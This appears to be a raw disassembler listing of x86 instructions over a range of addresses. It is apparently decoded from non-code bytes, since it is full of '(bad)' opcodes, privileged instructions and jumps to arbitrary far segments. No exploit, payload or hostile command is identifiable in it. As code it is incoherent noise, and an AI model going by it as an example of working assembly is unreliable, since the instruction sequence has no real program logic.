  69ee7c:	mov    ds:0x34ea10d4,al
  69ee81:	sub    bh,BYTE PTR [edx]
  69ee83:	stos   DWORD PTR es:[edi],eax
  69ee84:	and    DWORD PTR [eax-0x57],ebp
  69ee87:	lock (bad) 
  69ee89:	shl    esp,0xa6
  69ee8c:	dec    esp
  69ee8d:	fwait
  69ee8e:	xchg   ecx,eax
  69ee8f:	xchg   ebp,eax
  69ee90:	sbb    bl,BYTE PTR [edx+ecx*4]
  69ee93:	into   
  69ee94:	lods   al,BYTE PTR ds:[esi]
  69ee95:	pop    es
  69ee96:	sub    BYTE PTR [esi],dh
  69ee98:	sbb    ah,0x70
  69ee9b:	add    eax,0x78b9a93a
  69eea0:	mov    WORD PTR [edi-0x1befeac5],es
  69eea6:	xchg   ebp,eax
  69eea7:	and    ecx,ecx
  69eea9:	xchg   edi,eax
  69eeaa:	neg    BYTE PTR [edi]
  69eeac:	mov    ds:0x35298f6a,ax
  69eeb2:	daa    
  69eeb3:	pop    es
  69eeb4:	mov    edi,0x27928c3
  69eeb9:	dec    edi
  69eeba:	scas   al,BYTE PTR es:[edi]
  69eebb:	add    al,al
  69eebd:	stc    
  69eebe:	nop
  69eebf:	pop    ds
  69eec0:	aam    0x89
  69eec2:	inc    edi
  69eec3:	stc    
  69eec4:	inc    esi
  69eec5:	cwd    
  69eec7:	retf   0xed78
  69eeca:	mov    ebp,0x639400d8
  69eecf:	ret    
  69eed0:	stos   BYTE PTR es:[edi],al
  69eed1:	mov    ecx,0x3057d848
  69eed6:	(bad)  
  69eed7:	and    eax,0x27e8809b
  69eedc:	lods   al,BYTE PTR ds:[esi]
  69eedd:	xor    edx,ebp
  69eedf:	pusha  
  69eee0:	xchg   edx,eax
  69eee1:	mov    fs,WORD PTR [esi+0x3b1b1bf9]
  69eee7:	shr    al,0xef
  69eeea:	je     0x69eedd
  69eeec:	or     eax,0x79d2b4e2
  69eef1:	mov    bl,0x3d
  69eef3:	cmc    
  69eef4:	icebp  
  69eef5:	cmp    esp,edi
  69eef7:	inc    ecx
  69eef9:	das    
  69eefa:	imul   esp,ecx,0xb
  69eefd:	ins    DWORD PTR es:[edi],dx
  69eefe:	xor    dh,BYTE PTR [eax+0x10c9806b]
  69ef04:	pop    ds
  69ef05:	xchg   ecx,eax
  69ef06:	jae    0x69ef03
  69ef08:	hlt    
  69ef09:	sub    ebp,ecx
  69ef0b:	mov    esp,edx
  69ef0d:	sub    DWORD PTR [esi],ebp
  69ef0f:	ror    DWORD PTR [edi+0x34],0x24
  69ef13:	xor    DWORD PTR [ebx-0x76f7ec6e],esi
  69ef19:	setp   BYTE PTR [edi]
  69ef1c:	sbb    BYTE PTR [edx+0x37],al
  69ef1f:	and    BYTE PTR [edi+0x23],ch
  69ef22:	sahf   
  69ef23:	jmp    0x69ef85
  69ef25:	add    BYTE PTR [edx-0x19c27f21],ah
  69ef2b:	dec    ebx
  69ef2c:	xor    eax,0xfc9aa524
  69ef31:	test   eax,0xa2840d42
  69ef36:	or     DWORD PTR [edi+0x320f18c6],ecx
  69ef3c:	mov    al,ds:0xe340921a
  69ef41:	cmp    dl,cl
  69ef43:	pop    edi
  69ef44:	add    al,0x3c
  69ef46:	je     0x69eef8
  69ef48:	js     0x69ef0c
  69ef4a:	jmp    0x69ef3c
  69ef4c:	dec    eax
  69ef4d:	test   BYTE PTR [edi],ch
  69ef4f:	rol    BYTE PTR [eax+eiz*4-0x24],1
  69ef53:	aas    
  69ef54:	and    eax,0xd1202e8a
  69ef59:	cdq    
  69ef5a:	ds mov esi,0xd53de666
  69ef60:	ja     0x69ef99
  69ef62:	add    ax,WORD PTR [esi]
  69ef65:	push   ebp
  69ef66:	lods   al,BYTE PTR ds:[esi]
  69ef67:	cmovl  ebx,DWORD PTR [edi+0x3f22b203]
  69ef6e:	xor    DWORD PTR [edi-0x74de39cc],eax
  69ef74:	ret    
  69ef75:	mov    WORD PTR [ecx-0x4219438c],?
  69ef7b:	and    al,0x82
  69ef7d:	sub    BYTE PTR [edx+0x17],bh
  69ef80:	int    0x87
  69ef82:	ss jmp 0xaca9:0x8883f83f
  69ef8a:	jbe    0x69ef40
  69ef8c:	mov    ds,WORD PTR [edx]
  69ef8e:	dec    eax
  69ef8f:	inc    esi
  69ef90:	adc    dh,BYTE PTR ss:[ebx+0x12]
  69ef94:	pop    esi
  69ef95:	out    dx,al
  69ef96:	mov    eax,ds:0xd45af48f
  69ef9b:	add    al,BYTE PTR [edi]
  69ef9d:	xchg   ebx,eax
  69ef9e:	cli    
  69ef9f:	or     BYTE PTR [ebx-0x7a047de9],al
  69efa5:	jle    0x69ef53
  69efa7:	xchg   ecx,eax
  69efa8:	push   eax
  69efa9:	mov    esi,0xc8ee0ffa
  69efae:	mov    al,ds:0x51637a78
  69efb3:	jo     0x69f024
  69efb5:	fimul  DWORD PTR [eax+edi*4-0x31e172bd]
  69efbc:	jecxz  0x69efbb
  69efbe:	xor    eax,0x76f7b4d
  69efc3:	jbe    0x69ef70
  69efc5:	jmp    0x69eff2
  69efc7:	pop    esp
  69efc8:	shr    DWORD PTR [ebx+0x3b8e6911],0x4
  69efcf:	sub    esp,DWORD PTR [eax]
  69efd1:	mov    edx,DWORD PTR [edx]
  69efd3:	cmp    al,0x39
  69efd5:	jmp    0xe5eb:0x37ff463c
  69efdc:	mov    esp,0xa49f42ca
  69efe1:	fsubr  DWORD PTR [ecx+eax*1-0x37954423]
  69efe8:	push   cs
  69efe9:	or     BYTE PTR cs:[edx-0x65],ch
  69efed:	mov    al,0x5e
  69efef:	push   ss
  69eff0:	ror    BYTE PTR [ecx],1
  69eff2:	and    esi,eax
  69eff4:	xchg   edi,eax
  69eff5:	(bad)  
  69eff6:	push   esp
  69eff7:	aaa    
  69eff8:	inc    ecx
  69eff9:	scas   eax,DWORD PTR es:[edi]
  69effa:	lds    ebx,FWORD PTR [ebx+edx*8+0x1c]
  69effe:	add    eax,0x339ec721
  69f003:	jnp    0x69f003
  69f005:	lds    esi,FWORD PTR [edi-0x7c8e765e]
  69f00b:	mov    al,0x5a
  69f00d:	mov    bh,0xa1
  69f00f:	frstor [ecx]
  69f011:	bound  ebx,QWORD PTR [eax]
  69f013:	in     eax,dx
  69f014:	daa    
  69f015:	call   0xd372f0e6
  69f01a:	pop    edx
  69f01b:	sub    eax,0xed9c60bb
  69f020:	int    0x21
  69f022:	jl     0x69f09a
  69f024:	cmp    DWORD PTR [edx-0x22],0xd2022e65
  69f02b:	jno    0x69f050
  69f02d:	adc    BYTE PTR [ecx+0x26],0x76
  69f031:	jno    0x69f045
  69f033:	daa    
  69f034:	leave  
  69f035:	hlt    
  69f036:	clc    
  69f037:	das    
  69f038:	mov    edi,esi
  69f03a:	mov    ds:0x801211dc,al
  69f03f:	jbe    0x69eff3
  69f041:	dec    edx
  69f042:	add    edi,ecx
  69f044:	fwait
  69f045:	ss mov ebx,0xecfd4e9d
  69f04b:	or     BYTE PTR [edi+edx*4+0x646b2062],cl
  69f052:	xor    eax,0x2c909ac3
  69f057:	sbb    al,0x7f
  69f059:	ret    0xf1f4
  69f05c:	and    eax,0x8ab8b8b7
  69f061:	imul   edx,esp,0xffffffbc
  69f064:	icebp  
  69f065:	iret   
  69f066:	and    eax,0x1ee25916
  69f06b:	hlt    
  69f06c:	test   esi,eax
  69f06e:	dec    ecx
  69f06f:	cs jg  0x69f0aa
  69f072:	jnp    0x69f095
  69f074:	push   ds
  69f075:	(bad)  
  69f076:	arpl   WORD PTR [ebp+ebx*1-0x27],bp
  69f07a:	inc    edi
  69f07b:	test   eax,0xfa5110b6
  69f080:	scas   al,BYTE PTR es:[edi]
  69f081:	inc    ebp
  69f082:	adc    DWORD PTR [esi+eiz*4+0x5cc5d060],esp
  69f089:	jp     0x69f043
  69f08b:	stos   BYTE PTR es:[edi],al
  69f08c:	xor    eax,0xbd9aa39e
  69f091:	sbb    DWORD PTR [ebx-0x47c4839a],0xfffffffc
  69f098:	adc    eax,0x69538a3c
  69f09d:	and    BYTE PTR [edi+0xd151b5a],cl
  69f0a3:	loop   0x69f0fb
  69f0a5:	pop    esi
  69f0a6:	xor    BYTE PTR [ebx-0x4d],0x37
  69f0aa:	mov    eax,0xb9c27427
  69f0b0:	push   edi
  69f0b1:	jb     0x69f09d
  69f0b3:	mov    al,0x58
  69f0b5:	mov    bl,0x95
  69f0b7:	jle    0x69f081
  69f0b9:	sti    
  69f0ba:	inc    ebp
  69f0bb:	cdq    
  69f0bc:	call   0xc4eb4969
  69f0c1:	mov    al,0x48
  69f0c3:	popa   
  69f0c4:	dec    eax
  69f0c5:	push   edi
  69f0c6:	ret    
  69f0c7:	mov    eax,0x316ec12c
  69f0cc:	dec    ebp
  69f0cd:	nop
  69f0ce:	mov    dh,0x9b
  69f0d0:	out    dx,eax
  69f0d1:	inc    ebx
  69f0d2:	sub    eax,0x1d2f3aac
  69f0d7:	pop    ds
  69f0d8:	mov    edx,0xabcf68e5
  69f0dd:	test   al,0x44
  69f0df:	leave  
  69f0e0:	arpl   WORD PTR [esi-0x3b4d9503],bx
  69f0e6:	push   0xffffff95
  69f0e8:	adc    ch,cl
  69f0ea:	call   0x37c1:0x5caf3155
  69f0f1:	dec    edi
  69f0f2:	pop    ebx
  69f0f3:	sbb    DWORD PTR [edx-0x9],eax
  69f0f6:	shl    DWORD PTR [eax],1
  69f0f8:	mov    cl,BYTE PTR [ecx-0x79]
  69f0fb:	jns    0x69f170
  69f0fd:	ret    
  69f0fe:	xchg   esi,eax
  69f0ff:	ins    BYTE PTR es:[edi],dx
  69f100:	or     al,BYTE PTR [eax+0x0]
  69f103:	mov    dl,0x9f
  69f105:	pop    ecx
  69f106:	sbb    cl,BYTE PTR [esi+0x1f5e7c]
  69f10c:	lahf   
  69f10d:	push   ecx
  69f10e:	ja     0x69f12e
  69f110:	fisub  DWORD PTR [edi+eax*4-0x405195d]
  69f117:	fadd   st(5),st
  69f119:	jno    0x69f12a
  69f11b:	xchg   esi,eax
  69f11c:	repz adc DWORD PTR [esi],0xa788bc4e
  69f123:	jge    0x69f10b
  69f125:	adc    esp,edi
  69f127:	stc    
  69f128:	int    0x27
  69f12a:	sub    cl,BYTE PTR [ebx+0x6e]
  69f12d:	and    DWORD PTR [eax+0x38],eax
  69f130:	mov    ebx,0xa1407937
  69f135:	adc    edi,DWORD PTR [edx+ebx*1-0x69]
  69f139:	mov    bh,0xf9
  69f13b:	adc    ch,al
  69f13d:	mov    ebp,0x91cef52e
  69f142:	ficom  WORD PTR [ebp+edx*2-0x3da29f7e]
  69f14a:	or     al,0x4a
  69f14c:	fcom   DWORD PTR [ecx+0x539e4216]
  69f152:	cmp    ebp,DWORD PTR [ebx+0x5c70ccb4]
  69f158:	(bad)  
  69f159:	leave  
  69f15a:	in     eax,0xb2
  69f15c:	cmp    eax,edi
  69f15e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69f15f:	scas   eax,DWORD PTR es:[edi]
  69f160:	repnz mov ebp,0x3b38bf14
  69f166:	jb     0x69f17e
  69f168:	sub    al,0x7c
  69f16a:	mov    esp,0x96a7f879
  69f16f:	and    eax,0x78846019
  69f174:	cmp    al,0x13
  69f176:	aad    0x80
  69f178:	dec    esi
  69f179:	test   al,0xff
  69f17b:	sar    DWORD PTR [eax-0x35d0760a],0x81
  69f182:	add    eax,0xd6bd9701
  69f187:	and    al,0xbd
  69f189:	cs cli 
  69f18b:	or     BYTE PTR [esp+edi*1-0x30],0xbc
  69f190:	xor    BYTE PTR [ecx],ch
  69f192:	mov    dh,0x9e
  69f194:	xor    ah,ah
  69f196:	pusha  
  69f197:	lds    esi,FWORD PTR [ebx+0x314facc9]
  69f19d:	jp     0x69f19a
  69f19f:	jecxz  0x69f150
  69f1a1:	leave  
  69f1a2:	fs popa 
  69f1a4:	or     eax,0x9f094cde
  69f1a9:	add    ebp,DWORD PTR [ebx-0x75]
  69f1ac:	add    ecx,DWORD PTR ds:0x5b91c9d3
  69f1b2:	push   0xffffffb6
  69f1b4:	lahf   
  69f1b5:	jl     0x69f1f3
  69f1b7:	loopne 0x69f201
  69f1b9:	lods   al,BYTE PTR ds:[esi]
  69f1ba:	pop    ebp
  69f1bb:	xchg   esp,eax
  69f1bc:	mov    esi,0x9f18515b
  69f1c1:	arpl   di,cx
  69f1c3:	push   edx
  69f1c4:	(bad)  
  69f1c5:	std    
  69f1c6:	pop    ebx
  69f1c7:	push   ebp
  69f1c8:	mov    dh,0x57
  69f1ca:	into   
  69f1cb:	mov    cs,WORD PTR [esi]
  69f1cd:	sub    BYTE PTR [edi-0x70],cl
  69f1d0:	inc    ecx
  69f1d1:	inc    edi
  69f1d2:	xor    BYTE PTR [eax+esi*4-0x75],ah
  69f1d6:	ins    DWORD PTR es:[edi],dx
  69f1d7:	mov    cl,dl
  69f1d9:	fidivr WORD PTR ss:[bp+si]
  69f1dd:	xchg   ebx,eax
  69f1de:	and    DWORD PTR [ebx+0x3be08810],0x531bdbb3
  69f1e8:	(bad)  
  69f1e9:	(bad)  
  69f1ea:	dec    edi
  69f1eb:	xor    DWORD PTR [edx],eax
  69f1ed:	cmp    al,0xa8
  69f1ef:	imul   DWORD PTR [edi-0x6d950228]
  69f1f5:	ins    BYTE PTR es:[edi],dx
  69f1f6:	loopne 0x69f228
  69f1f8:	adc    BYTE PTR ds:0xc0f8c57d,dh
  69f1fe:	ffree  st(3)
  69f200:	xchg   edx,eax
  69f201:	xor    ebp,DWORD PTR [ebx]
  69f203:	add    ecx,ecx
  69f205:	push   es
  69f206:	call   0x6eb9:0x973f3e32
  69f20d:	in     eax,0x85
  69f20f:	xchg   DWORD PTR [ecx],ebx
  69f211:	int3   
  69f212:	inc    ebp
  69f213:	mov    BYTE PTR ds:0x9b833d3e,ah
  69f219:	pusha  
  69f21a:	push   ds
  69f21b:	cdq    
  69f21c:	xchg   ebx,eax
  69f21d:	out    dx,eax
  69f21e:	aaa    
  69f21f:	mov    ds:0x79c84b63,eax
  69f224:	outs   dx,BYTE PTR ds:[esi]
  69f225:	sbb    al,0xa5
  69f227:	push   0x5c7def6e
  69f22c:	adc    dl,cl
  69f22e:	arpl   bx,dx
  69f230:	sahf   
  69f231:	push   ebp
  69f232:	retf   
  69f233:	(bad)  
  69f234:	xor    al,0xd0
  69f236:	out    0x7a,al
  69f238:	xchg   eax,edx
  69f23a:	retf   
  69f23b:	mov    eax,0xcda839ac
  69f240:	inc    ebx
  69f241:	jecxz  0x69f286
  69f243:	xor    DWORD PTR [ecx],esp
  69f245:	adc    al,0x67
  69f247:	sbb    eax,0x87a92e48
  69f24c:	retf   0x5a19
  69f24f:	pop    ecx
  69f250:	xchg   ecx,eax
  69f251:	shl    BYTE PTR [ebx+0x6be41ae8],cl
  69f257:	pop    ebp
  69f258:	shl    BYTE PTR [ecx],cl
  69f25a:	mov    al,ds:0x948b117
  69f25f:	icebp  
  69f260:	jmp    0x69f276
  69f262:	ja     0x69f24b
  69f264:	std    
  69f265:	pusha  
  69f266:	(bad)  
  69f267:	idiv   eax
  69f269:	(bad)  
  69f26a:	sbb    al,0x62
  69f26c:	stc    
  69f26d:	cmc    
  69f26e:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  69f270:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69f271:	lds    edi,FWORD PTR ds:0x7143d000
  69f277:	jnp    0x69f250
  69f279:	or     bl,BYTE PTR [ebx+0x3a]
  69f27c:	cld    
  69f27d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69f27e:	mov    esp,cr5
  69f281:	adc    BYTE PTR [ebx],ah
  69f283:	out    0xe0,al
  69f285:	push   0x5b
  69f287:	loop   0x69f22c
  69f289:	stos   DWORD PTR es:[edi],eax
  69f28a:	pop    ebp
  69f28b:	jle    0x69f22e
  69f28d:	inc    edx
  69f28e:	sti    
  69f28f:	mov    ecx,0xff8cb569
  69f294:	jmp    0x9d99:0x4cf5dd74
  69f29b:	lds    ebp,FWORD PTR [ecx-0x64]
  69f29e:	enter  0xd202,0xa9
  69f2a2:	shl    BYTE PTR [eax+0x643d9e8e],cl
  69f2a8:	inc    esp
  69f2a9:	mov    eax,DWORD PTR [ebx+esi*1]
  69f2ac:	stos   DWORD PTR es:[edi],eax
  69f2ad:	jg     0x69f327
  69f2af:	pop    es
  69f2b0:	arpl   WORD PTR [esi+esi*2],si
  69f2b3:	sub    ah,dl
  69f2b5:	int    0x6a
  69f2b7:	shl    BYTE PTR ds:0x47b4fed2,1
  69f2bd:	(bad)
  69f2c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69f2c2:	mov    ds,ebx
  69f2c4:	pop    edx
  69f2c5:	dec    edi
  69f2c6:	dec    ecx
  69f2c7:	lock jnp 0x69f281
  69f2ca:	ret    
  69f2cb:	sub    eax,0xe8cf35ba
  69f2d0:	outs   dx,BYTE PTR ds:[esi]
  69f2d1:	sub    al,0xf0
  69f2d3:	mov    dh,0x98
  69f2d5:	xor    BYTE PTR ds:0xea2b3cbb,0xb5
  69f2dc:	das    
  69f2dd:	ins    BYTE PTR es:[edi],dx
  69f2de:	push   0xffffffba
  69f2e0:	out    dx,al
  69f2e1:	sar    esi,1
  69f2e3:	outs   dx,BYTE PTR ds:[esi]
  69f2e4:	jp     0x69f347
  69f2e6:	dec    esi
  69f2e7:	imul   ebx,DWORD PTR [eax+ecx*1],0x13
  69f2eb:	inc    esi
  69f2ec:	call   0xf156cfa5
  69f2f1:	inc    edx
  69f2f2:	out    0xa2,al
  69f2f4:	jmp    0x22caf21c
  69f2f9:	dec    edi
  69f2fa:	push   ecx
  69f2fb:	mov    cl,0xe4
  69f2fd:	xor    eax,0xf855cea3
  69f302:	push   DWORD PTR [edx]
  69f304:	add    DWORD PTR [edi-0x1f7b766f],edi
  69f30a:	xor    ah,BYTE PTR [edx+ebx*4-0x42a30f6d]
  69f311:	in     eax,dx
  69f312:	fisub  WORD PTR [ebx+0x7af05502]
  69f318:	xchg   BYTE PTR es:[edx+edi*4],al
  69f31c:	or     DWORD PTR [esi],ecx
  69f31e:	out    0x14,al
  69f320:	pusha  
  69f321:	ins    DWORD PTR es:[edi],dx
  69f322:	jb     0x69f324
  69f324:	push   es
  69f325:	or     ebp,DWORD PTR [esi+eiz*2+0x6a]
  69f329:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69f32a:	xor    bh,BYTE PTR [ecx]
  69f32c:	xlat   BYTE PTR ds:[ebx]
  69f32d:	mov    cl,BYTE PTR [ebx]
  69f32f:	jg     0x69f35c
  69f331:	mov    al,0x4b
  69f333:	es jg  0x69f2e7
  69f336:	jg     0x69f2dd
  69f338:	sbb    cl,BYTE PTR [edx+0x41]
  69f33b:	cmp    esi,eax
  69f33d:	fcom   DWORD PTR [ecx-0x1c]
  69f340:	add    eax,0xe0dd2cfc
  69f345:	pop    ebx
  69f346:	mov    edi,0x34ce7275
  69f34b:	mov    eax,ds:0x691d7377
  69f350:	sub    eax,0xbb7aa4e6
  69f355:	adc    edx,edi
  69f357:	test   eax,0x63b3aa0
  69f35c:	adc    al,0xa4
  69f35e:	push   esi
  69f35f:	xchg   edi,eax
  69f360:	jmp    DWORD PTR [edi]
  69f362:	jl     0x69f346
  69f364:	rcr    ebp,1
  69f366:	in     al,dx
  69f367:	dec    eax
  69f368:	clc    
  69f369:	mov    ebx,0xd9f97e60
  69f36e:	xlat   BYTE PTR ds:[ebx]
  69f36f:	addr16 pusha 
  69f371:	in     al,dx
  69f372:	hlt    
  69f373:	adc    al,0x68
  69f375:	and    BYTE PTR [eax+0x28439228],bl
  69f37b:	in     eax,0x1
  69f37d:	rol    DWORD PTR gs:[edx],1
  69f380:	jae    0x69f334
  69f382:	imul   edx,DWORD PTR [ebx],0x2b760288
  69f388:	retf   0xd97
  69f38b:	xchg   ebx,eax
  69f38c:	fisttp QWORD PTR [esi-0x194a33f9]
  69f392:	repnz inc eax
  69f394:	and    bl,BYTE PTR [eax]
  69f396:	push   esi
  69f397:	cld    
  69f398:	add    eax,0xa810e9c8
  69f39d:	pop    edi
  69f39e:	pusha  
  69f39f:	enter  0x19f8,0x4
  69f3a3:	sub    DWORD PTR ds:0x2def26ca,ebp
  69f3a9:	and    ebx,DWORD PTR [ecx]
  69f3ab:	loop   0x69f3ca
  69f3ad:	pop    esi
  69f3ae:	cli    
  69f3af:	sbb    ah,ah
  69f3b1:	cdq    
  69f3b2:	into   
  69f3b3:	cwde   
  69f3b4:	inc    ebx
  69f3b5:	mov    eax,ds:0x701496b7
  69f3ba:	jg     0x69f429
  69f3bc:	fs xchg ecx,eax
  69f3be:	mov    eax,0x7735baeb
  69f3c3:	scas   al,BYTE PTR es:[edi]
  69f3c4:	sub    DWORD PTR [ecx],ebx
  69f3c6:	jno    0x69f358
  69f3c8:	and    BYTE PTR [edx+0x14],dl
  69f3cb:	sub    ecx,DWORD PTR [ebx-0x5e6e0789]
  69f3d1:	and    eax,0x791d312b
  69f3d6:	push   ecx
  69f3d7:	(bad)  
  69f3d9:	and    edi,DWORD PTR [ecx-0x20a8a6f7]
  69f3df:	cmp    BYTE PTR [edx],ah
  69f3e1:	mov    al,ds:0x3396365a
  69f3e6:	dec    edx
  69f3e7:	sub    DWORD PTR [ecx-0x52],ecx
  69f3ea:	test   eax,0x5c14c4d8
  69f3ef:	add    edi,DWORD PTR ds:0xca3d8d8e
  69f3f5:	leave  
  69f3f6:	sbb    ebx,DWORD PTR [ebp-0x1e35a3c3]
  69f3fc:	test   eax,0xbd55d710
  69f401:	add    BYTE PTR [eax],cl
  69f403:	gs js  0x69f3a1
  69f406:	(bad)  
  69f407:	out    dx,al
  69f408:	mov    ebp,0xa1721952
  69f40d:	stos   DWORD PTR es:[edi],eax
  69f40e:	jecxz  0x69f3c1
  69f410:	cli    
  69f411:	mov    ecx,0xcbbd7967
  69f416:	in     al,0xbe
  69f418:	xchg   ebp,eax
  69f419:	into   
  69f41a:	int3   
  69f41b:	test   DWORD PTR [ecx+0x2f],0xc1f67d36
  69f422:	sbb    BYTE PTR [ebp+0x47ca1ff4],ah
  69f428:	lds    ebp,FWORD PTR [ebx-0x7dd0e4cf]
  69f42e:	imul   ebx,esp,0x9eb1b0f3
  69f434:	push   esp
  69f435:	sbb    cl,ah
  69f437:	shl    DWORD PTR [eax],0xb4
  69f43a:	jns    0x69f4b0
  69f43c:	add    BYTE PTR [eax+0x70968ec7],al
  69f442:	mov    edx,DWORD PTR [esi]
  69f444:	loop   0x69f47b
  69f446:	pop    edx
  69f447:	arpl   WORD PTR [edi+eiz*4-0x4f],si
  69f44b:	ja     0x69f4b4
  69f44d:	pop    ebp
  69f44e:	jb     0x69f41c
  69f450:	sub    BYTE PTR [eax+0x15a84e1e],dh
  69f456:	out    0x23,eax
  69f458:	dec    edi
  69f459:	(bad)  
  69f45a:	ins    BYTE PTR es:[edi],dx
  69f45b:	test   eax,0xc6f06214
  69f460:	inc    ebp
  69f461:	jecxz  0x69f494
  69f463:	ds pop ebx
  69f465:	fs aad 0x2
  69f468:	xor    eax,0xd06dd574
  69f46d:	xchg   edx,eax
  69f46e:	jg     0x69f49d
  69f470:	add    eax,0x6e213802
  69f475:	cmp    eax,0x293d8f1d
  69f47a:	cmp    DWORD PTR [ebx],eax
  69f47c:	jp     0x69f4e3
  69f47e:	dec    ebp
  69f47f:	scas   al,BYTE PTR es:[edi]
  69f480:	pop    edi
  69f481:	xchg   ebp,eax
  69f482:	mov    DWORD PTR es:[ecx],esi
  69f485:	stc    
  69f486:	mov    bh,0x55
  69f488:	loopne 0x69f44f
  69f48a:	xor    DWORD PTR [eax+0x74605ba2],eax
  69f490:	mov    ds:0x96e0da07,al
  69f495:	out    0xfb,eax
  69f497:	push   edi
  69f498:	cmp    edx,ebx
  69f49a:	sub    eax,0x491ae995
  69f49f:	push   0x5650313d
  69f4a4:	aam    0xf7
  69f4a6:	data16 adc BYTE PTR [edi],bl
  69f4a9:	icebp  
  69f4aa:	add    DWORD PTR [edi],ebx
  69f4ac:	dec    edx
  69f4ad:	cmp    edx,eax
  69f4af:	adc    al,0x83
  69f4b1:	pop    ebp
  69f4b2:	btc    DWORD PTR fs:[eax-0x170dea8f],ecx
  69f4ba:	dec    edx
  69f4bb:	sub    al,0xaa
  69f4bd:	das    
  69f4be:	inc    edx
  69f4bf:	adc    DWORD PTR [esi+0x36807ae],ebx
  69f4c5:	int3   
  69f4c6:	fnsave [ebx+0x63]
  69f4c9:	popf   
  69f4ca:	adc    BYTE PTR ds:0xeaeead82,al
  69f4d0:	jmp    0xd481a7c9
  69f4d5:	jl     0x69f469
  69f4d7:	sahf   
  69f4d8:	or     dh,BYTE PTR [eax+0x530aa6fa]
  69f4de:	sub    al,0x68
  69f4e0:	lods   al,BYTE PTR ds:[esi]
  69f4e1:	scas   eax,DWORD PTR es:[edi]
  69f4e2:	enter  0x759b,0x8d
  69f4e6:	lea    ecx,[ebp+0x50414634]
  69f4ec:	scas   eax,DWORD PTR es:[edi]
  69f4ed:	inc    ecx
  69f4ee:	adc    eax,eax
  69f4f0:	fsub   QWORD PTR [edx+edi*8+0x5e]
  69f4f4:	sbb    al,0xf
  69f4f6:	jp     0x69f50c
  69f4f8:	push   edx
  69f4f9:	sub    eax,0x62c01a1f
  69f4fe:	pop    ds
  69f4ff:	jnp    0x69f52b
  69f501:	int    0xf3
  69f503:	icebp  
  69f504:	push   cs
  69f505:	or     BYTE PTR [ecx+eax*2-0x2c],0x1e
  69f50a:	sbb    eax,0x4cc1cf41
  69f50f:	out    0x6d,al
  69f511:	dec    ebp
  69f512:	ret    0x1987
  69f515:	pop    esp
  69f516:	add    edx,DWORD PTR [esi+0x5e16f3aa]
  69f51c:	in     al,dx
  69f51d:	test   DWORD PTR [ecx+0x4b],ebx
  69f520:	or     BYTE PTR [esi],dh
  69f522:	(bad)  
  69f523:	jbe    0x69f53d
  69f525:	in     al,dx
  69f526:	rol    BYTE PTR [ebx],cl
  69f528:	mov    DWORD PTR [eax-0x51],esp
  69f52b:	stc    
  69f52c:	not    BYTE PTR [edi-0x41dac3d]
  69f532:	rol    BYTE PTR [edx-0x760d2b12],cl
  69f538:	dec    esi
  69f539:	jg     0x69f59c
  69f53b:	(bad)  
  69f53d:	cwde   
  69f53e:	stos   DWORD PTR es:[edi],eax
  69f53f:	and    al,0x3f
  69f541:	(bad)  
  69f542:	ins    BYTE PTR es:[edi],dx
  69f543:	fcmovnu st,st(6)
  69f545:	je     0x69f560
  69f547:	cmp    ebp,DWORD PTR [ecx+0x3d189892]
  69f54d:	pop    ds
  69f54e:	push   edi
  69f54f:	pop    ecx
  69f550:	add    cl,cl
  69f552:	mov    esi,DWORD PTR [eax-0x6f]
  69f555:	or     eax,ecx
  69f557:	sub    ecx,DWORD PTR [ebx-0x4a]
  69f55a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69f55b:	outs   dx,DWORD PTR ds:[esi]
  69f55c:	push   0x37b30e29
  69f561:	shl    ch,1
  69f563:	pusha  
  69f564:	inc    esp
  69f565:	shl    BYTE PTR [esi+eax*1-0x78a38b98],1
  69f56c:	pushf  
  69f56d:	retf   0x9b54
  69f570:	adc    DWORD PTR [ebp+0x38e84727],ebx
  69f576:	rcr    DWORD PTR [ebp+ecx*8+0x7bfec093],1
  69f57d:	clc    
  69f57e:	sbb    DWORD PTR [esi+ebx*8+0x6b60e29d],ebp
  69f585:	pop    ss
  69f586:	push   cs
  69f587:	mov    ecx,0x6cc7343f
  69f58c:	inc    edi
  69f58d:	add    ecx,0x47
  69f590:	ja     0x69f59b
  69f592:	inc    bx
  69f594:	or     ch,dh
  69f596:	mov    ds:0xf8bfcc83,al
  69f59b:	xor    al,BYTE PTR [ebp+0xcde7f3a]
  69f5a1:	xchg   ecx,eax
  69f5a2:	push   ebx
  69f5a3:	xor    al,0xee
  69f5a5:	cmp    eax,0x9f8e9ee4
  69f5aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69f5ab:	pop    ds
  69f5ac:	xchg   ecx,eax
  69f5ad:	in     al,dx
  69f5ae:	ja     0x69f5a0
  69f5b0:	(bad)  
  69f5b1:	sar    BYTE PTR [eax],cl
  69f5b3:	imul   ebx,DWORD PTR [esi-0x5],0xd16b22c8
  69f5ba:	shl    BYTE PTR [esi-0x22780f7d],cl
  69f5c0:	clc    
  69f5c1:	add    ecx,edx
  69f5c3:	test   DWORD PTR [eax-0x568bac36],esi
  69f5c9:	stos   BYTE PTR es:[edi],al
  69f5ca:	sbb    al,0x84
  69f5cc:	cld    
  69f5cd:	xchg   esp,eax
  69f5ce:	jb     0x69f583
  69f5d0:	scas   eax,DWORD PTR es:[edi]
  69f5d1:	mov    DWORD PTR [ecx+0x78157276],edx
  69f5d7:	xchg   esi,eax
  69f5d8:	add    eax,0xba12cbfc
  69f5dd:	enter  0x5d53,0x6c
  69f5e1:	enter  0x716a,0xa4
  69f5e5:	pop    ebx
  69f5e6:	imul   ebx,DWORD PTR [ebp*4+0xe14e368],0xa37a0223
  69f5f1:	hlt    
  69f5f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69f5f3:	cs retf 
  69f5f5:	jmp    0x69f60a
  69f5f7:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  69f5f9:	inc    ebp
  69f5fa:	icebp  
  69f5fb:	adc    ah,BYTE PTR [ebx]
  69f5fd:	scas   al,BYTE PTR es:[edi]
  69f5fe:	stc    
  69f5ff:	frstor [ebx]
  69f601:	sbb    eax,DWORD PTR [edx+0xd]
  69f604:	inc    edx
  69f605:	sti    
  69f606:	loope  0x69f684
  69f608:	f2xm1  
  69f60a:	mov    ds:0x30ab558c,al
